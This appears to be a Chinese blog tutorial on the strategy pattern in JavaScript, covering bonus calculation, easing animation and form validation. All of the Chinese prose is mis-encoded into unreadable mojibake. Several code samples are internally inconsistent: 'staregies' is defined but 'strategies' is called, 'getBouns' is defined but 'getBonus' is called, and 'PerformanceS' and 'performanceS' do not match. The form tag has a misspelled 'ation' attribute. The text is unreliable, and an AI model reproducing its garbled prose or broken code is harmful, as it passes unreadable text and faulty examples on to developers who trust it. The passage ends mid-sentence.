ç­–ç•¥æ¨¡å¼æŒ‡å®šæ˜¯å®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ã€‚å°†ä¸å˜çš„éƒ¨åˆ†å’Œå˜åŒ–çš„éƒ¨åˆ†éš”å¼€æ˜¯æ¯ä¸ªè®¾è®¡æ¨¡å¼çš„ä¸»é¢˜ï¼Œç­–ç•¥æ¨¡å¼ä¹Ÿä¸ä¼šä¾‹å¤–ï¼Œç­–ç•¥æ¨¡å¼çš„ç›®çš„å°±æ˜¯å°†ç®—æ³•çš„ä½¿ç”¨ä¸Žç®—æ³•çš„å®žçŽ°åˆ†ç¦»å¼€æ¥ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç®—æ³•çš„ä½¿ç”¨æ–¹å¼æ˜¯ä¸å˜çš„ï¼Œéƒ½æ˜¯æ ¹æ®æŸä¸ªç®—æ³•å–å¾—è®¡ç®—åŽçš„å¥–é‡‘æ•°é¢ã€‚ç®—æ³• çš„å®žçŽ°æ˜¯å„å¼‚å’Œå˜åŒ–çš„ï¼Œæ¯ç§ç»©æ•ˆå¯¹åº”ç€ä¸åŒçš„è®¡ç®—è§„åˆ™ã€‚ ä¸€ä¸ªåŸºäºŽç­–ç•¥æ¨¡å¼çš„ç¨‹åºè‡³å°‘ç”±ä¸¤éƒ¨åˆ†ç»„æˆã€‚ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ç»„ç­–ç•¥ç±»ï¼Œç­–ç•¥ç±»å°è£…äº†å…·ä½“çš„ç®—æ³•ï¼Œå¹¶è´Ÿè´£å…·ä½“çš„è®¡ç®—è¿‡ç¨‹ã€‚ç¬¬äºŒéƒ¨åˆ†æ˜¯çŽ¯å¢ƒç±» Contextï¼ŒContext æŽ¥å—å®¢æˆ·çš„è¯·æ±‚ï¼ŒéšåŽæŠŠè¯·æ±‚å§”æ‰˜ç»™æŸä¸€ä¸ªç­–ç•¥ç±»ã€‚è¯´æ˜Ž Context ä¸­è¦ç»´æŒå¯¹æŸä¸ªç­–ç•¥å¯¹è±¡çš„å¼•ç”¨ã€‚ çŽ°åœ¨ç”¨ç­–ç•¥æ¨¡å¼æ¥é‡æž„ä¸Šé¢çš„ä»£ç ï¼Œç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯æ¨¡ä»¿ä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€ä¸­å®žçŽ°ã€‚æŠŠæ¯ç§ç»©æ•ˆçš„è®¡ç®—è§„åˆ™éƒ½å°è£…åœ¨å¯¹åº”çš„ç­–ç•¥ç±»é‡Œé¢ï¼š 1234567891011121314var performanceS = function()&#123;&#125;performanceS.prototype.calculate = function(salary)&#123; return salary * 4;&#125;var performanceA = function()&#123;&#125;performanceA.prototype.calculate = function(salary)&#123; return salary * 3;&#125;var performanceB = function()&#123;&#125;performanceB.prototype.calculate = function(salary)&#123; return salary * 2;&#125; å®šä¹‰å¥–é‡‘ç±» Bonus: 12345678910111213var Bonus = function () &#123; this.salary = null; this.strategy = null;&#125;Bonus.prototype.setSalary = function(salary)&#123; this.salary = salary;&#125;Bonus.prototype.setStrategy = function(salary)&#123; this.strategy = salary;&#125;Bonus.prototype.getBouns = function(salary)&#123; return this.strategy.calculate(this.salary);&#125; è°ƒç”¨ï¼š 123456789// bonus æœ¬èº«æ²¡æœ‰èƒ½åŠ›è¿›è¡Œè®¡ç®—ï¼Œè€Œæ˜¯æŠŠè¯·æ±‚å§”æ‰˜ç»™åŠ›ä¹‹å‰ä¿å­˜å¥½çš„ç­–ç•¥å¯¹è±¡var bonus = new Bonus();bonus.setSalary(1000);bonus.setStrategy(new PerformanceS()); // è®¾ç½®ç­–ç•¥å¯¹è±¡console.log(bonus.getBonus()); // 4000bonus.setStrategy(new PerformanceA()); // è®¾ç½®ç­–ç•¥å¯¹è±¡console.log(bonus.getBonus()); // 3000 ç”¨ç­–ç•¥æ¨¡å¼é‡æž„äº†è¿™æ®µè®¡ç®—å¹´ç»ˆå¥–çš„ä»£ç åŽï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡ç­–ç•¥æ¨¡å¼é‡æž„ä¹‹åŽï¼Œä»£ç å˜å¾—æ›´åŠ æ¸…æ™°äº†ï¼Œå„ä¸ªç±»çš„èŒè´£æ›´åŠ é²œæ˜Žäº†ã€‚ä½†è¿™æ®µä»£ç æ˜¯åŸºäºŽä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€çš„æ¨¡ä»¿ã€‚ JavaScript ç‰ˆæœ¬çš„ç­–ç•¥æ¨¡å¼ä¸Šé¢ä»£ç ä¸­ï¼Œæˆ‘ä»¬è®© strategy å¯¹è±¡ä»Žå„ä¸ªç­–ç•¥ç±»ä¸­åˆ›å»ºè€Œæ¥ï¼Œè¿™æ˜¯æ¨¡æ‹Ÿä¸€äº›ä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€çš„å®žçŽ°ã€‚å®žé™…ä¸Šåœ¨ JavaScript ï¼Œå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥æ›´ç®€å•å’Œç›´æŽ¥çš„åšæ³•æ˜¯æŠŠ stategy ç›´æŽ¥å®šä¹‰ä¸ºå‡½æ•°ï¼š 1234567891011var staregies = &#123; 'S':function(salary)&#123; return salary * 4; &#125;, 'A':function(salary)&#123; return salary * 3; &#125;, 'B':function(salary)&#123; return salary * 2; &#125;&#125; è€ŒContext ä¹Ÿæ²¡æœ‰å¿…è¦é€šè¿‡ Bonus æ¥è¡¨ç¤ºï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨ calculateBonus å‡½æ•°å……å½“ Context æ¥æŽ¥å—ç”¨æˆ·çš„è¯·æ±‚ã€‚ 12345var calculateBonus = function (level, salary) &#123; return strategies[level](salary);&#125;console.log(calculateBonus('S',2000));console.log(calculateBonus('A',3000)); å¤šæ€åœ¨ç­–ç•¥æ¨¡å¼ä¸­çš„ä½“çŽ°é€šè¿‡ä½¿ç”¨ç­–ç•¥æ¨¡å¼é‡æž„ä»£ç ï¼Œæ¶ˆé™¤äº†åŽŸæ¥ç¨‹åºä¸­å¤§ç‰‡çš„æ¡ä»¶åˆ†æ”¯è¯­å¥ã€‚æ‰€æœ‰è·Ÿè®¡ç®—å¥–é‡‘æœ‰å…³çš„é€»è¾‘éƒ½ä¸æ”¾åœ¨ Context ä¸­ï¼Œè€Œæ˜¯åˆ†å¸ƒåœ¨å„ä¸ªç­–ç•¥å¯¹è±¡ä¸­ã€‚Context å¹¶æ²¡æœ‰è®¡ç®—å¥–é‡‘çš„èƒ½åŠ›ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªèŒè´£å§”æ‰˜ç»™äº†æŸä¸ªç­–ç•¥å¯¹è±¡ã€‚æ¯ä¸ªç­–ç•¥å¯¹è±¡è´Ÿè´£çš„ç®—æ³•å„è‡ªå°è£…åœ¨å¯¹è±¡å†…éƒ¨ã€‚å½“æˆ‘ä»¬å¯¹è¿™äº›ç­–ç•¥å¯¹è±¡å‘å‡ºè®¡ç®—å¥–é‡‘çš„è¯·æ±‚çš„æ—¶å€™ï¼Œå®ƒä»¬ä¼šè¿”å›žå„è‡ªä¸åŒçš„è®¡ç®—ç»“æžœï¼Œè¿™æ­£æ˜¯å¯¹è±¡å¤šæ€æ€§çš„ä½“çŽ°ã€‚æ›¿æ¢ Context ä¸­å½“å‰ä¿å­˜çš„ç­–ç•¥å¯¹è±¡ï¼Œä¾¿èƒ½æ‰§è¡Œä¸åŒçš„ç®—æ³•æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æžœã€‚ ä½¿ç”¨ç­–ç•¥æ¨¡å¼å®žçŽ°ç¼“åŠ¨åŠ¨ç”»HTML5 ç‰ˆæœ¬çš„è¡—å¤´éœ¸çŽ‹æ¸¸æˆï¼Œè®©æ¸¸æˆçš„ä¸»è§’è·³è·ƒæˆ–è€…ç§»åŠ¨ï¼Œå®žé™…ä¸Šåªæ˜¯è®©è¿™ä¸ª div æŒ‰ç…§ä¸€å®šçš„ç¼“åŠ¨ç®—æ³•è¿›è¡Œè¿åŠ¨è€Œå·²ã€‚ å¦‚æžœæˆ‘ä»¬æ˜Žç™½äº†æ€Žä¹ˆæ ·è®©ä¸€ä¸ªå°çƒè¿åŠ¨èµ·æ¥ï¼Œé‚£ä¹ˆç¦»ç¼–å†™ä¸€ä¸ªå®Œæ•´çš„æ¸¸æˆå°±ä¸é¥è¿œäº†ï¼Œå‰©ä¸‹çš„åªæ˜¯ä¸€äº›æŠŠé€»è¾‘ç»„ç»‡èµ·æ¥çš„ä½“åŠ›æ´»ã€‚ å®žçŽ°åŠ¨ç”»æ•ˆæžœçš„åŽŸç†ç”¨ JavaScript å®žçŽ°åŠ¨ç”»æ•ˆæžœçš„åŽŸç†è·ŸåŠ¨ç”»åˆ¶ä½œçš„åŽŸç†æ˜¯ä¸€æ ·çš„ï¼ŒåŠ¨ç”»ç‰‡æ˜¯æŠŠä¸€äº›å·®è·ä¸å¤§çš„åŽŸç”»ä»¥è¾ƒå¿«çš„å¸§æ•°æ’­æ”¾ï¼Œæ¥è¾¾åˆ°è§†è§‰ä¸Šçš„åŠ¨ç”»æ•ˆæžœã€‚åœ¨ JavaScript ä¸­å¯ä»¥é€šè¿‡è¿žç»­æ”¹å˜å…ƒç´ çš„æŸä¸ª CSS å±žæ€§ï¼Œå¦‚ top,bottom,background-position æ¥å®žçŽ°åŠ¨ç”»æ•ˆæžœã€‚ æ€è·¯å’Œä¸€äº›å‡†å¤‡å·¥ä½œç¼–å†™ä¸€ä¸ªåŠ¨ç”»ç±»å’Œç¼“åŠ¨ç®—æ³•ï¼Œragå°çƒä»¥å„ç§å„æ ·çš„ç¼“åŠ¨æ•ˆæžœåœ¨é¡µé¢ä¸­è¿åŠ¨ã€‚ åœ¨è¿åŠ¨å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦æå‰è®°å½•ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè‡³å°‘åŒ…æ‹¬ä»¥ä¸‹ä¿¡æ¯ï¼š åŠ¨ç”»å¼€å§‹æ—¶ï¼Œå°çƒæ‰€åœ¨çš„åŽŸå§‹ä½ç½® å°çƒç§»åŠ¨çš„ç›®æ ‡ä½ç½® åŠ¨ç”»å¼€å§‹çš„å‡†ç¡®ç‚¹æ—¶é—´ å°çƒæŒç»­è¿åŠ¨çš„æ—¶é—´ éšåŽï¼Œæˆ‘ä»¬ä¼šç”¨ setInterval åˆ›å»ºä¸€ä¸ªå®šæ—¶å™¨ï¼Œå®šæ—¶å™¨æ¯éš”19ms å¾ªçŽ¯ä¸€æ¬¡ã€‚åœ¨å®šæ—¶å™¨çš„æ¯ä¸€å¸§é‡Œé¢ï¼Œæˆ‘ä»¬ä¼šæŠŠåŠ¨ç”»æ¶ˆè€—çš„æ—¶é—´ã€å°çƒçš„åˆå§‹ä½ç½®ã€å°çƒç›®æ ‡ä½ç½®å’ŒåŠ¨ç”»æŒç»­çš„æ€»æ—¶é—´ç­‰ä¿¡æ¯ä¼ å…¥ç¼“åŠ¨ç®—æ³•ã€‚è¯¥ç®—æ³•ä¼šé€šè¿‡å‡ ä¸ªå‚æ•°ï¼Œè®¡ç®—å‡ºå°çƒå½“å‰åº”è¯¥åœ¨çš„ä½ç½®ã€‚æœ€åŽå†æ›´æ–°è¯¥ div å¯¹åº”çš„ CSS å±žæ€§ï¼Œå°çƒå°±å¯ä»¥é¡ºåˆ©åœ°è¿åŠ¨èµ·æ¥äº†ã€‚ è®©å°çƒè¿åŠ¨èµ·æ¥å¸¸è§çš„ç¼“åŠ¨ç®—æ³•ï¼Œè¿™äº›ç®—æ³•æœ€åˆæ¥è‡ª Flash ï¼Œä½†å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°ç§»æ¤åˆ°å…¶ä»–è¯­è¨€ä¸­ã€‚ è¿™äº›ç®—æ³•éƒ½æŽ¥å— 4 ä¸ªå‚æ•°ï¼Œè¿™ 4ä¸ªå‚æ•°çš„å«ä¹‰åˆ†åˆ«æ˜¯åŠ¨ç”»å·²æ¶ˆè€—çš„æ—¶é—´ã€å°çƒçš„åˆå§‹ä½ç½®ã€å°çƒç›®æ ‡ä½ç½®ã€åŠ¨ç”»æŒç»­æ—¶é—´ï¼Œè¿”å›žçš„å€¼åˆ™æ˜¯åŠ¨ç”»å…ƒç´ åº”è¯¥å¤„åœ¨çš„å½“å‰ä½ç½®ã€‚ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920var tween = &#123; linear: function (t, b, c, d) &#123; return c * t / d + b; &#125;, easeIn: function (t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, strongEaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;, strongEaseOut: function (t, b, c, d) &#123; return c * ((t = t / d - 1) * t * t * t * t + 1) + b; &#125;, sineaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t + b; &#125;, sineaseOut: function (t, b, c, d) &#123; return c * ((t = t / d - 1) * t * t + 1) + b; &#125;&#125; æŽ¥ç€åœ¨é¡µé¢ä¸­æ”¾ç½®ä¸€ä¸ªdivï¼š 12345&lt;body&gt; &lt;div style="position:absolute;background:blue" id="div"&gt; æˆ‘æ˜¯ div &lt;/div&gt;&lt;/body&gt; å®šä¹‰ Animate ç±»ï¼ŒAnimate çš„æž„é€ å‡½æ•°æŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå³å°†è¿åŠ¨èµ·æ¥çš„ dom èŠ‚ç‚¹ã€‚Animate ç±»çš„ä»£ç å¦‚ä¸‹ï¼š 123456789var Animate = function (dom) &#123; this.dom = dom; // è¿›è¡Œè¿åŠ¨çš„ dom èŠ‚ç‚¹ this.startTime = 0; // åŠ¨ç”»å¼€å§‹æ—¶é—´ this.startPos = 0; // åŠ¨ç”»å¼€å§‹æ—¶ï¼ŒdomèŠ‚ç‚¹çš„ä½ç½®ï¼Œå³ dom çš„åˆå§‹ä½ç½® this.endPos = 0; // åŠ¨ç”»ç»“æŸæ—¶ï¼ŒdomèŠ‚ç‚¹çš„ä½ç½®ï¼Œå³ dom çš„ç›®æ ‡ä½ç½® this.properyName = null; // dom èŠ‚ç‚¹éœ€è¦è¢«æ”¹å˜çš„ css å±žæ€§å this.easing = null; // ç¼“åŠ¨ç®—æ³• this.duration = null; // åŠ¨ç”»æŒç»­æ—¶é—´&#125; Animate.prototype.start æ–¹æ³•è´Ÿè´£å¯åŠ¨è¿™ä¸ªåŠ¨ç”»ï¼Œåœ¨åŠ¨ç”»è¢«å¯åŠ¨çš„çž¬é—´ï¼Œè¦è®°å½•ä¸€äº›ä¿¡æ¯ï¼Œä¾›ç¼“åŠ¨ç®—æ³•åœ¨ä»¥åŽè®¡ç®—å°çƒå½“å‰ä½ç½®çš„æ—¶å€™ä½¿ç”¨ã€‚åœ¨è®°å½•å®Œè¿™äº›æ¶ˆæ¯åŽï¼Œæ­¤æ–¹æ³•è¿˜è¦è´Ÿè´£å¯åŠ¨å®šæ—¶å™¨ã€‚ 1234567891011121314Animate.prototype.start = function (propertyName, endPos, duration, easing) &#123; this.startTime = +new Date; // åŠ¨ç”»å¯åŠ¨æ—¶é—´ this.startPos = this.dom.getBoundingClientRect()[propertyName]; // dom èŠ‚ç‚¹åˆå§‹ä½ç½® this.properyName = propertyName; this.endPos = endPos; // dom èŠ‚ç‚¹ç›®æ ‡ä½ç½® this.duration = duration; // åŠ¨ç”»æŒç»­æ—¶é—´ this.easing = tween[easing]; // ç¼“åŠ¨ç®—æ³• var self = this; var timeId = setInterval(function () &#123; // å¯åŠ¨å®šæ—¶å™¨ï¼Œå¼€å§‹æ‰§è¡ŒåŠ¨ç”» if (self.step() === false) &#123; // å¦‚æžœåŠ¨ç”»å·²ç»“æŸï¼Œåˆ™æ¸…é™¤å®šæ—¶å™¨ clearInterval(timeId); &#125; &#125;);&#125; start æ–¹æ³•æŽ¥æ”¶å››ä¸ªå‚æ•°ï¼š propertyNameï¼šè¦æ”¹å˜çš„ CSS å±žæ€§å endPosï¼šå°çƒè¿åŠ¨çš„ç›®æ ‡ä½ç½® durationï¼šåŠ¨ç”»æŒç»­æ—¶é—´ easingï¼šç¼“åŠ¨ç®—æ³• Animate.prototype.step æ–¹æ³•ï¼Œä»£è¡¨å°çƒè¿åŠ¨çš„æ¯ä¸€å¸§è¦åšçš„äº‹æƒ…ï¼Œåœ¨æ­¤å¤„ï¼Œè¿™ä¸ªæ–¹æ³•è´Ÿè´£è®¡ç®—å°çƒçš„å½“å‰ä¸ºå­©å­å’Œè°ƒç”¨æ›´æ–° CSS å±žæ€§å€¼çš„æ–¹æ³• Animate.prototype.update. 12345678910Animate.prototype.step = function () &#123; var t = +new Date; // å–å¾—å¼€å§‹æ—¶é—´ if (t &gt;= this.startTime + this.duration) &#123; // å¦‚æžœå½“å‰æ—¶é—´å¤§äºŽåŠ¨ç”»å¼€å§‹æ—¶é—´åŠ ä¸ŠåŠ¨ç”»æŒç»­æ—¶é—´ï¼Œè¯´æ˜ŽåŠ¨ç”»å·²ç»ç»“æŸäº†ï¼Œæ­¤æ—¶è¦ä¿®æ­£å°çƒçš„ä½ç½®ã€‚å¹¶è¿”å›ž false æ¸…é™¤æ—¶é—´å®šæ—¶å™¨ã€‚ this.update(this.endPos); // æ›´æ–°å°çƒçš„ CSS å±žæ€§å€¼ return false; &#125; // pos ä¸ºå°çƒçš„ä½ç½® var pos = this.easing(t - this.startTime, this.startPos, this.endPos - this.startPos, this.duration); this.update(pos); // æ›´æ–°å°çƒçš„ CSS å±žæ€§å€¼&#125; æœ€åŽæ˜¯è´Ÿè´£æ›´æ–°å°çƒçš„ CSS å±žæ€§å€¼çš„ Animate.prototype.update æ–¹æ³•ï¼š 123Animate.prototype.update = function(pos)&#123; this.dom.style[this.properyName] = pos + 'px';&#125; æµ‹è¯•ï¼š 123var div = document.getElementById('div');var animate = new Animate(div);animate.start('left',500,700,'strongEaseOut'); å¯ä»¥çœ‹åˆ°ï¼Œä½ çš„div å…ƒç´ åœ¨é¡µé¢ä¸Šæ¬¢å¿«åœ°æ»‘åŠ¨ã€‚ä½¿ç”¨ç­–ç•¥ç±»æŠŠç®—æ³•ä¼ å…¥åŠ¨ç”»ç±»é‡Œï¼Œæ¥è¾¾åˆ°å„ç§ä¸åŒç¼“åŠ¨æ•ˆæžœï¼Œè¿™äº›ç®—æ³•éƒ½æ˜¯å¯ä»¥è½»æ˜“åœ°è¢«æ›¿æ¢æˆå¦ä¸€ä¸ªç®—æ³•ã€‚è¿™æ˜¯ç­–ç•¥æ¨¡å¼çš„ç»å…¸è¿åŠ¨ä¹‹ä¸€ã€‚ç­–ç•¥æ¨¡å¼çš„å®žçŽ°å¹¶ä¸å¤æ‚ï¼Œå…³é”®æ˜¯å¦‚ä½•ä»Žç­–ç•¥æ¨¡å¼çš„å®žçŽ°èƒŒåŽï¼Œæ‰¾åˆ°å°è£…ã€å§”æ‰˜å’Œå¤šæ€æ€§è¿™äº›æ€æƒ³çš„ä»·å€¼ã€‚ æ›´å¹¿ä¹‰çš„ç®—æ³•ç­–ç•¥æ¨¡å¼æŒ‡å®šæ˜¯ä¸€ç³»åˆ— çš„ç®—æ³•ï¼Œå¹¶ä¸”æŠŠå®ƒä»¬å°è£…èµ·æ¥ã€‚ ä»Žå®šä¹‰ä¸Šçœ‹ï¼Œç­–ç•¥æ¨¡å¼æ˜¯ç”¨æ¥å°è£…ç®—æ³•çš„ï¼Œä½†å¦‚æžœæŠŠç­–ç•¥æ¨¡å¼ä»…ä»…ç”¨æ¥å°è£…ç®—æ³•ï¼Œæœªå…æœ‰ä¸€ç‚¹å¤§æå°ç”¨ã€‚åœ¨å®žé™…å¼€å‘ä¸­ï¼Œé€šå¸¸ä¼šæŠŠç®—æ³•çš„å«ä¹‰æ‰©æ•£å¼€æ¥ï¼Œä½¿ç­–ç•¥æ¨¡å¼ä¹Ÿå¯ä»¥ç”¨æ¥å°è£…ä¸€ç³»åˆ—çš„â€œä¸šåŠ¡è§„åˆ™â€ã€‚åªè¦è¿™äº›ä¸šåŠ¡è§„åˆ™æŒ‡å‘çš„ç›®æ ‡ä¸€è‡´ï¼Œå¹¶ä¸”å¯ä»¥è¢«æ›¿æ¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ç­–ç•¥æ¨¡å¼æ¥å°è£…å®ƒä»¬ã€‚ è¡¨å•éªŒè¯åœ¨ä¸€ä¸ª Web é¡¹ç›®ä¸­ï¼Œæ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ç­‰åŠŸèƒ½çš„å®žçŽ°éƒ½ç¦»ä¸å¼€æäº¤è¡¨å•ã€‚ å‡è®¾æˆ‘ä»¬æ­£åœ¨ç¼–å†™çš„ä¸€ä¸ªæ³¨å†Œçš„é¡µé¢ï¼Œåœ¨ç‚¹å‡»æ³¨å†ŒæŒ‰é’®ä¹‹å‰ï¼Œæœ‰å¦‚ä¸‹å‡ æ¡æ ¡éªŒé€»è¾‘ã€‚ ç”¨æˆ·åä¸èƒ½ä¸ºç©º å¯†ç é•¿åº¦ä¸èƒ½å°‘äºŽ6ä½ æ‰‹æœºå·ç å¿…é¡»ç¬¦åˆæ ¼å¼ è¡¨å•æ ¡éªŒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬1234567891011121314151617181920212223&lt;form ation="http://xxx.com/register" id="registerForm" method="post"&gt; è¯·è¾“å…¥ç”¨æˆ·åï¼š&lt;input type="text" name="Username"&gt; è¯·è¾“å…¥å¯†ç ï¼š&lt;input type="text" name="password"&gt; è¯·è¾“å…¥æ‰‹æœºå·ç ï¼š&lt;input type="text" name="phoneNumber"&gt; &lt;button type="submit"&gt;æäº¤&lt;/button&gt;&lt;/form&gt;&lt;script&gt; var registerForm = document.getElementById('registerForm'); registerForm.onSubmit = function()&#123; if(registerForm.userName.value === '')&#123; alert('ç”¨æˆ·åä¸ä¸ºç©º'); return false; &#125; if(registerForm.password.length &lt; 6)&#123; alert('å¯†ç é•¿åº¦ä¸èƒ½å°‘äºŽ6ä½'); return false; &#125; if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(registerForm.phoneNumber.value))&#123; alert('æ‰‹æœºå·ç æ ¼å¼ä¸æ­£ç¡®'); return false; &#125; &#125; &lt;/script&gt; ç¼ºç‚¹æ˜¾è€Œæ˜“è§ï¼š registerForm.onSubmit å‡½æ•°åºžå¤§ï¼ŒåŒ…å«äº†å¾ˆå¤š if-else è¯­å¥ å‡½æ•°ç¼ºä¹å¼¹æ€§ï¼Œå¯å¤ç”¨æ€§å·® ç”¨ç­–ç•¥æ¨¡å¼é‡æž„è¡¨å•éªŒè¯ä¸‹é¢ç”¨ç­–ç•¥æ¨¡å¼æ¥é‡æž„è¡¨å•éªŒè¯çš„ä»£ç ï¼Œç¬¬ä¸€æ­¥æŠŠæ ¡éªŒé€»è¾‘éƒ½å°è£…æˆç­–ç•¥å¯¹è±¡ï¼š 1234567891011121314151617var strategies = &#123; isNonEmpty:function(value,errorMsg)&#123; if(value === '')&#123; return errorMsg; &#125; &#125;, minLength:function(value,length,errorMsg)&#123; if(value.length &lt; length)&#123; return errorMsg; &#125; &#125;, isMobile:function(value,errorMsg)&#123; if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(value))&#123; return errorMsg; &#125; &#125;&#125; æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çŒªå‘¢æ¯”å®žçŽ° Validatorç±»ã€‚Validator è¿™é‡Œä½œä¸º Context ï¼Œè´Ÿè´£æŽ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚å¹¶å§”æ‰˜ç»™ strategy å¯¹è±¡ã€‚åœ¨ç»™å‡º Validator ç±»çš„ä»£ç ä¹‹å‰ï¼Œæœ‰å¿…è¦æå‰äº†è§£ç”¨æˆ·æ˜¯å¦‚ä½•å‘ Validator ç±»å‘é€è¯·æ±‚çš„ï¼Œè¿™æœ‰åŠ©äºŽæˆ‘ä»¬çŸ¥é“è¯¥å¦‚ä½•åŽ»ç¼–å†™ Validator ç±»çš„ä»£ç ï¼š 1234567891011121314151617181920var validataFunc = function()&#123; var validator = new Validator(); // åˆ›å»ºä¸€ä¸ª validator å¯¹è±¡ // æ·»åŠ ä¸€äº›æ ¡éªŒè§„åˆ™ validator.add(registerForm.userName,'isNonEmpty','ç”¨æˆ·åä¸ä¸ºç©º'); validator.add(registerForm.password,'minLength:6','å¯†ç é•¿åº¦ä¸èƒ½å°‘äºŽ6ä½'); validator.add(registerForm.phoneNumber,'isMobile','æ‰‹æœºå·ç æ ¼å¼ä¸æ­£ç¡®'); var errorMsg = validator.start(); // èŽ·å–æ ¡éªŒç»“æžœ return errorMsg;&#125;var registerForm = document.getElementById('registerForm');registerForm.onSubmit = function()&#123; var errorMsg = validataFunc(); // å¦‚æžœ errorMsg æœ‰ç¡®åˆ‡çš„è¿”å›žå€¼ï¼Œè¯´æ˜Žæœªé€šè¿‡æ ¡éªŒ if(errorMsg)&#123; alert(errorMsg); return false; // é˜»æ­¢è¡¨å•æäº¤ &#125;&#125; ä»Žä¸Šé¢ä»£ç å¯ä»¥çœ‹å‡ºï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ª validator å¯¹è±¡ï¼Œç„¶åŽé€šè¿‡ validator.add æ–¹æ³•ï¼Œå¾€ validator å¯¹è±¡ä¸­æ·»åŠ äº†ä¸€äº›æ ¡éªŒè§„åˆ™ã€‚validator.add æ–¹æ³•æŽ¥å—ä¸‰ä¸ªå‚æ•°ã€‚ registerForm.xxx ä¸ºå‚ä¸Žæ ¡éªŒçš„name æ˜¯ xxx çš„input è¾“å…¥æ¡† â€˜minLength:6â€™ æ˜¯ä¸€ä¸ªä»¥å†’å·éš”å¼€çš„å­—ç¬¦ä¸²ã€‚å‰é¢æ˜¯ strategy å¯¹è±¡ï¼ŒåŽé¢ä»£è¡¨æ ¡éªŒè¿‡ç¨‹ä¸­çš„å‚æ•°ã€‚å¦‚æžœæ²¡æœ‰å†’å·åˆ™è¯´æ˜Žæ ¡éªŒè¿‡ç¨‹ä¸­ä¸éœ€è¦é¢å¤–çš„å‚æ•°ä¿¡æ¯ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å½“æ ¡éªŒä¸é€šè¿‡çš„æ—¶å€™è¿”å›žçš„é”™è¯¯ä¿¡æ¯ å½“æˆ‘ä»¬å¾€ validator å¯¹è±¡æ·»åŠ äº†ä¸€ç³»åˆ—çš„æ ¡éªŒè§„åˆ™åŽï¼Œä¼šè°ƒç”¨ validator.start(); æ–¹æ³•æ¥å¯åŠ¨æ ¡éªŒã€‚å¦‚æžœ validator.start è¿”å›žä¸€ä¸ªç¡®åˆ‡çš„ errorMsg å­—ç¬¦ä¸²å½“åšè¿”å›žå€¼ï¼Œè¯´æ˜Žè¯¥æ¬¡æ ¡éªŒæ²¡æœ‰é€šè¿‡ï¼Œæ­¤æ—¶éœ€è¦è¿”å›ž false æ¥é˜»æ­¢è¡¨å•çš„æäº¤ã€‚ æœ€åŽæ˜¯ Validator ç±»çš„å®žçŽ°ï¼š 1234567891011121314151617181920var Validator = function()&#123; this.cache = []; // ä¿å­˜æ ¡éªŒè§„åˆ™&#125;Validator.prototype.add = function(dom,rule,errorMsg)&#123; var ary = rule.split(':'); // æŠŠ strategy å’Œ å‚æ•°åˆ†å¼€ this.cache.push(function()&#123; //æŠŠæ ¡éªŒçš„æ­¥éª¤ç”¨ç©ºå‡½æ•°åŒ…è£…èµ·æ¥ï¼Œå¹¶ä¸”æ”¾å…¥ cache ä¸­ var strategy = ary.shift(); // ç”¨æˆ·æŒ‘é€‰çš„ stragety ary.unshift(dom.value); // æŠŠ input çš„ value æ·»åŠ åˆ°å‚æ•°åˆ—è¡¨çš„å¤´éƒ¨ ary.push(errorMsg); // å‚æ•°åˆ—è¡¨å°¾éƒ¨æŽ¨è¿›åŽ» errorMsg return strategies[strategy].apply(dom,ary); &#125;);&#125;Validator.prototype.start = function()&#123; for(var i=0,validataFunc;validataFunc=this.cache[i++];)&#123; var msg = validataFunc(); // å¼€å§‹æ ¡éªŒå¹¶å–å¾—æ ¡éªŒåŽçš„è¿”å›žä¿¡æ¯ if(msg)&#123; // å¦‚æžœæœ‰ç¡®åˆ‡çš„è¿”å›žä¿¡æ¯ï¼Œåˆ™è¯´æ˜Žæ ¡éªŒæ²¡æœ‰é€šè¿‡ return msg; &#125; &#125;&#125; ä½¿ç”¨ç­–ç•¥æ¨¡å¼é‡æž„ä»£ç ä¹‹åŽï¼Œæˆ‘ä»¬ä»…ä»…é€šè¿‡ â€œé…ç½®â€ çš„æ–¹å¼å®Œæˆäº†ä¸€ä¸ªè¡¨å•çš„éªŒè¯ï¼Œè¿™äº›æ ¡éªŒè§„åˆ™å¯ä»¥å¤ç”¨åœ¨ç¨‹åºçš„ä»»ä½•åœ°æ–¹ï¼Œè¿˜èƒ½ä½œä¸ºæ’ä»¶æ¥ä½¿ç”¨ï¼Œæ–¹ä¾¿è¢«ç§»æ¤åˆ°å…¶ä»–é¡¹ç›®ä¸­ã€‚ åœ¨ä¿®æ”¹æŸä¸ªæ ¡éªŒè§„åˆ™çš„æ—¶å€™ï¼Œä¸»è¦ç¼–å†™æˆ–è€…æ”¹å†™å°‘é‡çš„ä»£ç ã€‚ ç»™æŸä¸ªæ–‡æœ¬è¾“å…¥æ¡†æ·»åŠ å¤šç§æ 